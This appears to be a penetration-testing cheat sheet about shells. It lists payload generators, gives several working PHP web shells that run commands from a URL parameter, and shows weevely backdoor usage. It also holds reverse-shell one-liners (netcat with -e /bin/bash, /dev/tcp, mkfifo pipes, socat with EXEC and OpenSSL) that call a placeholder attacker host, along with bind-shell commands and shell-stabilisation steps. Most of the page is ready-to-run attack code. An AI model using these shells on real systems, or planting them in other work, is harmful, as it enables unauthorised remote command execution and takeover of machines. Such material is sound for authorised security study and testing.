# Shell

<div class="row row-cols-md-2"><div>

On Kali, you can find preinstalled reverse/web shells inside ([GitLab](https://gitlab.com/kalilinux/packages/webshells))

```bash
$ ls /usr/share/webshells
```

> If your target is missing a binary, you may be able to download a precompiled version on [andrew-d GitHub](https://github.com/andrew-d/static-binaries/tree/master/binaries) (2.3k ‚≠ê).
</div><div>

Using an attack vector (ex: file upload), we can use

* a **reverse shell**: we open a port on our machine, and the target connects to it. We can run commands on the target and hopefully do a successful privilege escalation.
* a **bind shell**: we open a port on the target and connect to it. This is like SSH, but we with a port we picked, and no login/password.
* a **web shell**: we are using a webpage with a form to run commands. It's a bit hard to use, but it may be the only way.
</div></div>

<hr class="sep-both">

## Tools to generate payloads

A payload is a code leading to a reverse/bind/web shell. You will pick one based on criteria like the platform...

<div class="row row-cols-md-2"><div>

üêç [msfvenom](metasploit/msfvenom.md) is a famous **script** to generate payloads. üêç

There is a **website** called [revshells](https://www.revshells.com/) that is also giving commands to listen, and some of msfvenom payloads.
</div><div>

There is a **script** called [revshellgen](https://github.com/t0thkr1s/revshellgen) (0.3k ‚≠ê) that is an automated and simplified interface to create payloads.

There is a **script** called [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ‚≠ê, 2018/2019) that is a simplified interface to create payloads.
</div></div>

<hr class="sep-both">

## web shell in PHP

If you created a file **xxx.php**, then you can run commands by accessing the URL **xxx.php?cmd=payload**. The result is wrapped with `<pre>` so that the result is not formatted and displayed raw. I added ` 2>&1` to redirect errors.

<div class="row row-cols-md-2 mt-4"><div>

* ‚û°Ô∏è compacted web shell with `shell_exec`  ([doc](https://www.php.net/manual/en/function.shell-exec.php))

```php
<?="<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>"; ?>
```

which is the same as

```php
<?php echo "<pre>".shell_exec(/* code */)."</pre>"; ?>
```

* ‚û°Ô∏è simple web shell with `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php
<?php
echo "<pre>";
echo system(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
?>
```
</div><div>

* ‚û°Ô∏è simple web shell with `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php
<?php
$output = "";
exec(($_GET["cmd"] ?? "whoami")." 2>&1", $output);
echo "<pre>".implode('<br>', $output)."</pre>";
?>
```

* ‚û°Ô∏è simple web shell with `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php
echo "<pre>";
echo passthru(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
```

* ‚û°Ô∏è [weevely3](https://github.com/epinna/weevely3) (2.7k ‚≠ê)

```bash
# generate a webshell.php protected by "password"
$ weevely generate <password> webshell.php
# connect to the web shell
$ weevely URL/webshell.php <password>
# see help
# ex: create a reverse shell
$ :backdoor_reversetcp IP PORT
```
</div></div>

<hr class="sep-both">

## Reverse shell

<div class="row row-cols-md-2 mt-3"><div>

* ‚û°Ô∏èPHP pentest monkey

You could check out [this script by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (1.4k ‚≠ê, 2015).

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/revshell.php
# ex: listen on HOST_IP port 4444
$ sed -i 's/127.0.0.1/HOST_IP/' /tmp/revshell.php
$ sed -i 's/1234/4444/' /tmp/revshell.php
```

* ‚û°Ô∏è Using netcat

```bash
# on the hacker machine
$ nc -lnvp port
```

```bash
# on the target
$ nc -c /bin/bash hacker_ip port
# or if -e is available
$ nc hacker_ip port -e /bin/bash
```
</div><div>

* ‚û°Ô∏è Each of the commands below is connecting to `IP:PORT`

```bash
# tcp socket
$ /bin/bash -i >& /dev/tcp/IP/PORT 0>&1
# named pipe
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP PORT >/tmp/f
```

* ‚û°Ô∏è Socat is creating a socket on each host and supports encryption.

```bash
# l = listen
$ socat TCP-L:port - # listen
$ socat TCP:hacker_ip:port EXEC:"bash -li" # connect from Linux
PS > socat TCP:hacker_ip:port EXEC:powershell.exe,pipes # connect from Windows, cmd.exe too
```

```bash
# more stable if target and host are running Linux
$ socat TCP-L:port FILE:`tty`,raw,echo=0
$ socat TCP:hacker_ip:port EXEC:"bash -li",pty,stderr,sigint,setsid,sane 
```

```bash
# encryption
$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
$ cat shell.key shell.crt > shell.pem
# use 
$ socat OPENSSL-LISTEN:port,cert=shell.pem,verify=0 [...]
$ socat OPENSSL:hacker_ip:port,verify=0 [...]
```

</div></div>

<hr class="sep-both">

## Bind shell

We are exchanging sides with what we do in reverse shells. Now you execute the code to listen on the target, and connect from your machine.

<div class="row row-cols-md-2"><div>

* ‚û°Ô∏è Example with netcat

```bash
# on the target
$ nc -lnvp port -e /bin/bash
```
```bash
# on the hacker machine
$ nc target_ip port
```
</div><div>

</div></div>

<hr class="sep-both">

## Stabilize reverse/bind shells

<div class="row row-cols-md-2"><div>

Usually, when opening a reverse/bind shell, the shell is quite unstable

* ‚û°Ô∏è Use a wrapper such as [penelope](https://github.com/brightio/penelope) (0.3k ‚≠ê)

```bash
$ git clone https://github.com/brightio/penelope.git
$ cd penelope
$ python penelope.py 4444
xxx@yyy:path$ # CTRL+C / ...
# on Linux: OK
# on Windows: only a basic shell
```

> You can press F12 to open penelope session manager, and use utilities to upload/download files... Use `interact 1` to go back.

* ‚û°Ô∏èUse a wrapper such as [pwncat-cs](https://github.com/calebstewart/pwncat) (1.8k ‚≠ê)

```bash
$ pwncat-cs -lp 4444
```

* ‚û°Ô∏èUse a wrapper such as [pwncat](https://github.com/cytopia/pwncat) (1.5k ‚≠ê)

```bash
$ pwncat -lvv 4444
```
</div><div>

There are a few solutions way to make things better

* ‚û°  Manually

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
xxx@yyy:path$ export TERM=xterm # can use clear...
# test with echo $TERM in another terminal
# xxx@yyy:path$ export TERM=xterm-256color
xxx@yyy:path$ # CTRL+Z
kali@kali:/tmp$ stty raw -echo; fg
xxx@yyy:path$ # can use CTRL+C / ...
xxx@yyy:path$ exit
kali@kali:/tmp$ reset # restore your terminal
# you may have to close your terminal
# if it does not respond
```

* ‚û°Ô∏è Manually resize your terminal

First, open another terminal and resize it to the size you want. Use `stty -a` and take note of the number of rows/columns.

Then, In the terminal to resize, use `stty rows n` and `stty cols n`

* ‚û°Ô∏è Use a wrapper such as [rlwrap](https://github.com/hanslub42/rlwrap) (1.8k ‚≠ê)

```bash
$ sudo rlwrap nc -lvnp 4444
xxx@yyy:path$ # still CTRL+C not working
```
</div></div>